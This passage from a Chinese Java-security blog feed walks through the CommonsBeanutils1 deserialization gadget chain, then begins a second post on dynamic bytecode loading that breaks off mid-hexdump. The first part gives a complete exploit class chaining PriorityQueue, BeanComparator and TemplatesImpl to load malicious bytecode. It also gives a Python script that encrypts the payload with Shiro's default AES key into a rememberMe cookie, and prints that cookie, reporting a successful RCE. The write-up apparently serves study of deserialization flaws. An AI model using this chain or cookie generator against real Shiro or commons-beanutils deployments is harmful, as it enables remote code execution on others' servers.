PriorityQueue</h2><p><code>java.util.PriorityQueue</code>是Java中的一个优先队列实现类，优先队列是一种特殊的队列，其中的元素按照一定的优先级顺序排列，而不是按照它们被插入的顺序排列。</p><p>在对<code>PriorityQueue</code>进行反序列化时，如果<code>PriorityQueue</code>是使用比较器进行排序的，则会重新设置比较器，并根据比较器对元素进行排序。</p><p>在如下readObject方法中调用了heapify方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reconstitutes the &#123;<span class="doctag">@code</span> PriorityQueue&#125; instance from a stream</span></span><br><span class="line"><span class="comment"> * (that is, deserializes it).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> s the stream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进heapify，发现其中存在siftDown的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而siftDown中又有siftDownUsingComparator方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>siftDownUsingComparator则对compare进行了调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据如上所有进行总结，当对PriorityQueue对象进行反序列化时，会通过PriorityQueue#readObject中的heapify方法调用到siftDownUsingComparator，并在其中触发BeanComparator#compare的调用；当设置property为outputProperties时，在BeanComparator#compare中会通过PropertyUtils#getProperty触发BeanComparator的getter方法即TemplatesImpl#getOutputProperties的执行，最终便能够达到加载任意恶意字节码，实施攻击。</p><h2 id="0x06-CommonsBeanutils1利用代码"><a href="#0x06-CommonsBeanutils1利用代码" class="headerlink" title="0x06 CommonsBeanutils1利用代码"></a>0x06 CommonsBeanutils1利用代码</h2><p>根据如上所有，构造最终的CommonsBeanutils1利用代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.7.0 &lt;= commons-beanutils &lt;= 1.9.4</span></span><br><span class="line"><span class="comment">// JDK 8 版本通杀，已在1.8.0_65和1.8.0_361版本上测试成功，</span></span><br><span class="line"><span class="comment">// 1.7.0_04、1.7.0_80和9均测试失败</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBRCEWithoutCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sink</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;T&quot;</span>);</span><br><span class="line">        <span class="comment">// 可去除，TemplatesImpl#readObject方法中有创建一个TransformerFactoryImpl，并赋值给_tfactory</span></span><br><span class="line">        <span class="comment">// setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        ReverseComparator与CaseInsensitiveComparator均符合同时实现了Comparator和Serializable，且原生JDK自带。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="comment">// BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先正常比较，以防在序列化时就触发恶意行为</span></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再利用反射将property设置为outputProperties，以调用obj的getter方法，即TemplatesImpl.getOutputProperties</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="comment">// 最好进行恶意比较，以触发getOutputProperties方法的执行，最终实现通过TemplatesImpl加载恶意字节码</span></span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----------------本地序列化与反序列化测试----------------</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CBRCEWithoutCC.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;CBRCEWithoutCC.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下是部分关键调用栈。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax), TemplatesImpl.java</span><br><span class="line">getProperty:<span class="number">290</span>, PropertyUtils (org.apache.commons.beanutils), PropertyUtils.java</span><br><span class="line">compare:<span class="number">150</span>, BeanComparator (org.apache.commons.beanutils), BeanComparator.java</span><br><span class="line">siftDownUsingComparator:<span class="number">722</span>, PriorityQueue (java.util), PriorityQueue.java</span><br><span class="line">siftDown:<span class="number">688</span>, PriorityQueue (java.util), PriorityQueue.java</span><br><span class="line">heapify:<span class="number">737</span>, PriorityQueue (java.util), PriorityQueue.java</span><br><span class="line">readObject:<span class="number">797</span>, PriorityQueue (java.util), PriorityQueue.java</span><br><span class="line">readObject:<span class="number">422</span>, ObjectInputStream (java.io), ObjectInputStream.java</span><br><span class="line">main:<span class="number">50</span>, CBRCEWithoutCC (com.javasec.cb), CBRCEWithoutCC.java</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cb1/2.png"></p><h2 id="0x07-CB1在Shiro中的利用"><a href="#0x07-CB1在Shiro中的利用" class="headerlink" title="0x07 CB1在Shiro中的利用"></a>0x07 CB1在Shiro中的利用</h2><p>在Shiro中是存在Commons BeanUtils组件的，但未必会有Commons Collections，所以恰巧可利用CommonsBeanutils1来攻击Shiro。</p><p>编写如下简易Python脚本，用于生成Payload，.&#x2F;CBRCEWithoutCC.ser文件是通过如上利用代码生成的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./CBRCEWithoutCC.ser&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>), AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cookie: rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(base64.b64encode(iv + encryptor.encrypt(pad(data))).decode()))</span><br><span class="line"><span class="comment"># Cookie: rememberMe=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</span></span><br></pre></td></tr></table></figure><p>运行脚本，打印恶意的rememberMe Payload，并在BurpSuite中构造恶意请求，最终成功实现RCE。</p><p><img src="/img/post/java-deserialization-cb1/3.png"></p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsBeanutils1.java</a></p><p><a href="https://commons.apache.org/proper/commons-beanutils/">https://commons.apache.org/proper/commons-beanutils/</a></p><p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中动态加载字节码的几种方法</title>
      <link href="/java-classloader.html"/>
      <url>/java-classloader.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-Java%E7%B1%BB%E5%8A%A0%E8%BD%BD">0x00 Java类加载</a></li><li><a href="#0x01-ClassLoader">0x01 ClassLoader</a></li><li><a href="#0x02-URLClassLoader">0x02 URLClassLoader</a></li><li><a href="#0x03-TemplatesImpl">0x03 TemplatesImpl</a></li><li><a href="#0x04-BCEL">0x04 BCEL</a></li><li><a href="#0x05-%E5%8F%82%E8%80%83">0x05 参考</a></li></ul><h2 id="0x00-Java类加载"><a href="#0x00-Java类加载" class="headerlink" title="0x00 Java类加载"></a>0x00 Java类加载</h2><p>Java程序在运行前，Java虚拟机会将Java源代码编译成字节码（即.class文件），字节码是编译器生成的一种中间形式的代码，它是Java源代码的编译结果，并非可直接执行的机器代码。</p><p>当Java程序被执行时，Java虚拟机负责将字节码加载到内存中并执行，这就是类加载的过程，这个过程可以简单分为三个阶段，即加载、链接和初始化。加载阶段负责将类文件加载到内存中，链接阶段负责对字节码进行验证、准备和解析，而初始化阶段则负责执行类的初始化器，准备类被使用。</p><p>以如下HelloWorld Java程序作为示例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若要运行此程序，首先需使用javac命令将这个Java程序编译出字节码，可使用javap命令反汇编class文件以查看字节码，或使用hexdump命令查看class文件的二进制内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$ javac HelloWorld.java</span><br><span class="line"></span><br><span class="line">$ javap -c -p -l HelloWorld.class</span><br><span class="line">Compiled from <span class="string">&quot;HelloWorld.java&quot;</span></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line">  public HelloWorld();</span><br><span class="line">    Code:</span><br><span class="line">       0: aload_0</span><br><span class="line">       1: invokespecial <span class="comment">#1  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">       4: <span class="built_in">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line 1: 0</span><br><span class="line"></span><br><span class="line">  public static void main(java.lang.String[]);</span><br><span class="line">    Code:</span><br><span class="line">       0: getstatic     <span class="comment">#2  // Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">       3: ldc           <span class="comment">#3  // String Hello World!</span></span><br><span class="line">       5: invokevirtual <span class="comment">#4  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span></span><br><span class="line">       8: <span class="built_in">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line 3: 0</span><br><span class="line">      line 4: 8</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ hexdump -C HelloWorld.class</span><br><span class="line">00000000  ca fe ba be 00 00 00 34  00 1d 0a 00 06 00 0f 09  |.......4........|</span><br><span class="line">00000010  00 10 00 11 08 00 12 0a  00 13 00 14 07 00 15 07  |................|</span><br><span class="line">00000020  00 16 01 00 06 3c 69 6e  69 74 3e 01 00 03 28 29  |.....&lt;init&gt;...()|</span><br><span class="line">00000030  56 01 00 04 43 6f 64 65  01 00 0f 4c 69 6e 65 4e  |V...Code...LineN|</span><br><span class="line">00000040  75 6d 62 65 72 54 61 62  6c 65 01 00 04 6d 61 69  |umberTable...mai|</span><br><span class="line">00000050  6e 01 00 16 28 5b 4c 6a  61 76 61 2f 6c 61 6e 67  |n...([Ljava/lang|</span><br><span class="line">00000060  2f 53 74 72 69 6e 67 3b  29 56 01 00 0a 53 6f 75  |/String;)V...Sou|</span><br><span class="line">00000070  72 63 65 46 69 6c 65 01  00 0f 48 65 6c 6c 6f 57  |rceFile...HelloW|</span><br><span class="line">00000080  6f 72 6c 64 2e 6a 61 76  61 0c 00 07 00 08 07 00  |orld.java.......|</span><br><span class="line">00000090  17 0c 00 18 00 19 01 00  0c 48 65 6c 6c 6f 20 57  |.........Hello W|</span><br><span class="line">000000a0  6f 72 6c 64 21 07 00 1a  0c 00 1b 00 1c 01 00 0a  |orld!...........|</span><br><span class="line">000000b0  48 65 6c 6c 6f 57 6f 72  6c 64 01 00 10 6a 61 76  |HelloWorld...jav|</span><br><span class="line">000000c0  61 2f 6c 61 6e 67 2f 4f  62 6a 65 63 74 01 00 10  |a/lang/Object...|</span><br><span class="line">000000d0  6a 61 76 61 2f 6c 61 6e  67 2f 53 79 73 74 65 6d  |java/lang/System|</span><br><span class="line">000000e0  01 00 03 6f 75 74 01 00  15 4c 6a 61 76 61 2f 69  |...out...Ljava/i|</span><br><span class="line">000000f0  6f 2f 50 72 69 6e 74 53  74 72 65 61 6d 3b 01 00  |o/PrintStream;..|</span><br><span class="line">00000100  13 6a 61 76 61 2f 69 6f  2f 50 72 69 6e 74 53 74  |.java/io/PrintSt|</span><br><span class="line">00000110  72 65 61 6d 01 00 07 70  72 69 6e 74 6c 6e 01 00  |ream...println..|</span><br><span class="line">00000120  15 28 4c 6a 61 76 61 2f  6c 61 6e 67 2f 53 74 72  |.(Ljava/lang/Str|</span><br><span class="line">00000130  69 6e 67 3b 29 56 00 21  00 05 00 06 00 00 00 00  |ing;)V.!........|</span><br><span class="line">00000140  00 02 00 01 00 07 00 08  00 01 00 09 00 00 00 1d  |................|</span><br><span class="line">00000150  00 01 00 01 00 00 00 05  2a b7 00 01 b1 00 00 00  |........*.......|</span><br><span class="line">00000160  01 00 0a 00 00 00 06 00  01 00 00 00 01 00 09 00  |................|</span><br><span class="line">00000170  0b 00 0c 00 01 00 09 00  00 00 25 00 02 00 01 00  |..........%.....|</span><br><span class="line">00000180  00 00 09 b2 00 02 12 03  b6 00 04 b1 00 00 00 01  |................|</span><br><span class="line">00000190  00 0a 00 00 00 0a 00 02  00 00 00 03 00 08 00 04  |................|</span><br><span class="line">000001a0  00 01 00 0d 00 00 00 02  00 0e                    |..........|</span><br><span 